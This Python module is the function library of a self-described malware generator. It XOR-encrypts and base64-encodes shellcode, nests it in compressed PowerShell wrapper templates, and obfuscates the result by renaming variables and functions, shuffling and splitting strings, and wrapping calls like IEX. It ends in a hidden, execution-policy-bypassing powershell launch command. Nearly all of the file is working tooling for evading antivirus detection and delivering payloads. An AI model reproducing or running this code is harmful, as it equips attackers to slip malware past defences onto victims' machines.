"""
malgen_functions.py
===================
This file contains all the functions required by the malware generator.
"""

import base64
import gzip
import random
import re
import string
import zlib

RESERVED_VARIABLES = [
    "$_",
    "$args",
    "$consolefilename",
    "$error",
    "$event",
    "$eventargs",
    "$eventsubscriber",
    "$executioncontext",
    "$true",
    "$false",
    "$foreach",
    "$home",
    "$host",
    "$input",
    "$iscoreclr",
    "$islinux",
    "$ismacos",
    "$iswindows",
    "$lastexitcode",
    "$matches",
    "$myinvocation",
    "$nestedpromptlevel",
    "$null",
    "$pid",
    "$profile",
    "$psboundparameters",
    "$pscmdlet",
    "$pscommandpath",
    "$psculture",
    "$psdebugcontext",
    "$pshome",
    "$psitem",
    "$psscriptroot",
    "$pssenderinfo",
    "$psuiculture",
    "$psversiontable",
    "$pwd",
    "$sender",
    "$shellid",
    "$stacktrace",
    "$switch",
    "$this",
]
RESERVED_WORDS = [
    "array",
    "assembly",
    "base",
    "begin",
    "break",
    "byte",
    "catch",
    "char",
    "class",
    "command",
    "configuration",
    "continue",
    "data",
    "datetime",
    "decimal",
    "define",
    "do",
    "double",
    "dynamicparam",
    "else",
    "elseif",
    "end",
    "enum",
    "exit",
    "false",
    "filter",
    "finally",
    "for",
    "foreach",
    "from",
    "function",
    "hashtable",
    "hidden",
    "if",
    "in",
    "inlinescript",
    "int",
    "int32",
    "interface",
    "intptr",
    "longbool",
    "mandatory",
    "module",
    "namespace",
    "parallel",
    "param",
    "private",
    "process",
    "public",
    "return",
    "sequence",
    "single",
    "static",
    "string",
    "switch",
    "throw",
    "trap",
    "true",
    "try",
    "type",
    "uint",
    "uint32",
    "until",
    "using",
    "var",
    "void",
    "while",
    "workflow",
    "xml",
]


def assemble_shuffled_string(input_string):
    # Shuffle a string, then assemble its obfuscated parts.
    (items, key) = string_shuffler(input_string)
    if items == [input_string]:
        return f"'{input_string}'"
    order = "'{" + "}{".join(str(index) for index in key) + "}'"
    deck = "'" + "','".join(items) + "'"
    return f"({order} -f {deck})"


def break_string(item):
    # Break a string into pieces.
    if len(item) < 17:
        # Don't break small strings.
        return item
    pieces = list()
    breaks = 0
    while len(item) > 16 and breaks < 10:
        slice = random.randint(8, len(item) - 8)
        pieces.append(item[:slice])
        item = item[slice:]
    pieces.append(item)
    return "(" + "'+'".join(pieces) + ")"


def break_strings(content):
    # Break long strings into short strings.
    str_rex = re.compile(r"(\'.+?\')")
    lines = content.split("\n")
    new_lines = list()
    for line in lines:
        strings = str_rex.findall(line)
        if not strings:
            new_lines.append(line)
            continue
        new_line = str(line)
        for item in strings:
            new_item = break_string(item)
            new_line = new_line.replace(item, new_item)
        new_lines.append(new_line)
    content = "\n".join(new_lines)
    return content


def choose_deflate_method():
    # Choose a random method for deflation.
    return random.choice(["deflatestream", "gzipstream"])


def decode_binary(byte_string, key):
    # Base64-decode the shellcode, then XOR-decrypt it.
    # This type of encrypted, encoded binary can be made with encode_binary.
    return b"".join(
        bytes([byte ^ key]) for byte in base64.b64decode(byte_string)
    )


def deflate(byte_string, method="None", key="None"):
    # Method should either be "gzipstream" or "deflatestream".
    key = random.randint(1, 255) if key == "None" else key
    method = choose_deflate_method() if method == "None" else method
    compressed_bytes = (
        zlib.compress(byte_string)[2:-4]
        if method == "deflatestream"
        else gzip.compress(byte_string)
    )
    encrypted_bytes = b"".join(
        bytes([byte ^ key]) for byte in compressed_bytes
    )
    return (key, method, base64.b64encode(encrypted_bytes).decode())


def encode_binary(byte_string):
    # XOR-encrypt the shellcode, then Base64-encode it.
    # The resulting Base64 can be decoded using the decode_binary function.
    key = random.randint(1, 255)
    return (
        base64.b64encode(
            b"".join(bytes([byte ^ key]) for byte in byte_string)
        ).decode(),
        key,
    )


def encode_new_object_declarations(content):
    # Change New-Object declarations to take strings.
    return re.sub(
        r"new-object ([a-z0-9\.]+)",
        r"new-object('\1')",
        content,
        0,
        re.IGNORECASE,
    )


def generate_random_varname():
    # Generate a random variable name.
    varname = f"${random_string(20)}"
    while (f"${varname}" in RESERVED_VARIABLES) or (varname in RESERVED_WORDS):
        varname = f"${random_string(20)}"
    return varname


def stuff_payload(file_path, replacements):
    # Load the file from file_path, stuff it with various replacements, and
    # return the result.
    with open(file_path) as infile:
        contents = infile.read().strip()
        for (key, value) in replacements.items():
            contents = contents.replace(key, str(value))
        return contents


def make_malware(payload_path, encoded, obfuscated):
    # Create an obfuscated PowerShell payload with the given Base64 payload.
    # First, encrypt and encode the binary payload.
    (payload, xor_key) = encode_binary(open(payload_path, "rb").read())
    # Add the binary payload to the payload.
    payload = stuff_payload(
        "resources/executor.ps1",
        {"{{B64_PAYLOAD}}": payload, "{{XOR_KEY}}": xor_key,},
    )
    # Encode the payload.
    (xor_key, method, payload) = deflate(obfuscate(payload, obfuscated))
    # Add the payload to the inner wrap.
    payload = stuff_payload(
        "resources/inner_wrap.ps1",
        {
            "{{EXECUTOR}}": payload,
            "{{XOR_KEY}}": xor_key,
            "{{METHOD}}": method,
        },
    )
    # Encode the payload.
    (_, _, payload) = deflate(obfuscate(payload, obfuscated), "gzipstream", key=0)
    # Stuff it into the outer wrap.
    payload = stuff_payload(
        "resources/outer_wrap.ps1", {"{{BASE64}}": payload,}
    )
    if encoded:
        # Return the encoded final wrap.
        return (
            "powershell -nopr -noni -w hid -exec byp -enc " + base64.b64encode(
                obfuscate(payload, obfuscated).decode().encode('utf-16-le')
            ).decode()
        )
    # Return the obfuscated final wrap.
    return (
        "powershell -nopr -noni -w hid -exec byp " +
        obfuscate(payload, obfuscated).decode()
    )


def modify_variable_assignment_methods(content):
    # Randomize the ways that data is assigned to variables.
    search_string = r"(?<!\])\$([0-9a-z\_]+) = (.+?);"
    new_content = re.sub(
        search_string, r"set ('\1') (\2);", content, 1, re.IGNORECASE
    )
    while new_content != content:
        content = str(new_content)
        new_content = re.sub(
            search_string, r"set ('\1') (\2);", content, 1, re.IGNORECASE
        )
    return content


def modify_variable_retrieval_methods(content):
    # Replace instances where variables' values are requested.
    regex = re.compile(r"(\$[0-9a-z\_]+)", re.IGNORECASE)
    varnames = sorted(
        set(
            [
                name
                for name in regex.findall(content)
                if name.lower() not in RESERVED_VARIABLES
                and name[1:].lower() not in RESERVED_WORDS
            ]
        )
    )
    lines = content.split("\n")
    new_lines = list()
    for line in lines:
        # Skip parameter definitions.
        if "param" in line.lower() or "$" not in line.lower():
            new_lines.append(line)
            continue
        parts = list()
        # Skip variables being typecast.
        while line:
            # Break lines apart.
            if "$" not in line:
                parts.append(line.replace("{{DS}}", "$"))
                break
            index = line.index("$")
            if line[index - 1] == "]":
                index += 1
            if line[:index]:
                parts.append(line[:index].replace("{{DS}}", "$"))
            line = (
                "{{DS}}" + line[index + 1 :]
                if line[0] == "$"
                else line[index:]
            )
        for index in range(len(parts)):
            # Replace variables.
            for varname in varnames:
                if varname not in parts[index]:
                    continue
                replacement = "((gci('variable:{{VARNAME}}')).'value')".replace(
                    "{{VARNAME}}", varname[1:]
                )
                if "+" not in parts[index]:
                    parts[index] = parts[index].replace(varname, replacement)
                break
        # Reassemble the pieces.
        new_lines.append("".join(parts))
    content = "\n".join(new_lines)
    return content


def obfuscate(content, obfuscated):
    # Obfuscate the provided PowerShell script.
    if obfuscated:
        content = substitute_variables(content)
        content = modify_variable_assignment_methods(content)
        content = modify_variable_retrieval_methods(content)
        content = encode_new_object_declarations(content)
        content = substitute_func_names(content)
        content = wrap_calls(content)
        content = break_strings(content)
        content = shuffle_strings(content)
        content = break_strings(content)
    return re.sub(r"  +", r" ", content.replace("\n", "")).encode()


def random_string(length):
    # Generate a random string of characters within the set length boundaries.
    available_characters = string.ascii_lowercase + string.digits
    varname = "".join(
        random.choice(available_characters) for _ in range(length)
    )
    return varname


def shuffle_strings(content):
    # Extract all strings, shuffle them up, and put them back.
    str_rex = re.compile(r"(\'.+?\')", re.IGNORECASE)
    strings = sorted(
        set(item for item in str_rex.findall(content) if len(item) > 4)
    )
    for s in strings:
        shuffled = assemble_shuffled_string(s[1:-1])
        content = content.replace(s, shuffled)
    return content


def split_string(input_string, level):
    # Recursively dice up a string.
    if len(input_string) < 17 or level > 5:
        return [input_string]
    index = random.randint(8, len(input_string) - 8)
    return split_string(input_string[:index], level + 1) + split_string(
        input_string[index:], level + 1
    )


def string_shuffler(input_string):
    # Split apart a string and shuffle its pieces.
    original = split_string(input_string, 1)
    order = list(range(len(original)))
    random.shuffle(order)
    return (
        [original[index] for index in order],  # Shuffled list.
        [order.index(item) for item in range(len(order))],  # Key.
    )


def substitute_func_names(content):
    # Randomize all defined function names.
    func_regex = re.compile(r"function ([a-z0-9\_]+)\{", re.IGNORECASE)
    functions = sorted(set(func_regex.findall(content)))
    new_funcs = list()
    for func in functions:
        new_func = random_string(10)
        while new_func in new_funcs:
            new_func = random_string(10)
        content = content.replace(func, new_func)
    return content


def substitute_variables(content):
    # Replace variable names with random varnames.
    var_regex = re.compile("\$[a-z0-9\_]+", re.IGNORECASE)
    variables = sorted(
        [
            item
            for item in set(var_regex.findall(content))
            if item.lower() not in RESERVED_VARIABLES
        ]
    )
    new_vars = list()
    for variable in variables:
        new_variable = generate_random_varname()
        while new_variable in new_vars:
            new_variable = generate_random_varname()
        content = content.replace(variable, new_variable)
        new_vars.append(new_variable)
    return content


def wrap_calls(content):
    # Wrap function calls, e.g. `&('IEX')`.
    regex = re.compile(r" (?!\-)[a-z0-9\-\_]+ ", re.IGNORECASE)
    calls = sorted(
        set(
            item.strip()
            for item in regex.findall(content)
            if item.strip().lower() not in RESERVED_WORDS
        )
    )
    for func in calls:
        content = content.replace(f" {func} ", f" &('{func}') ")
    return content
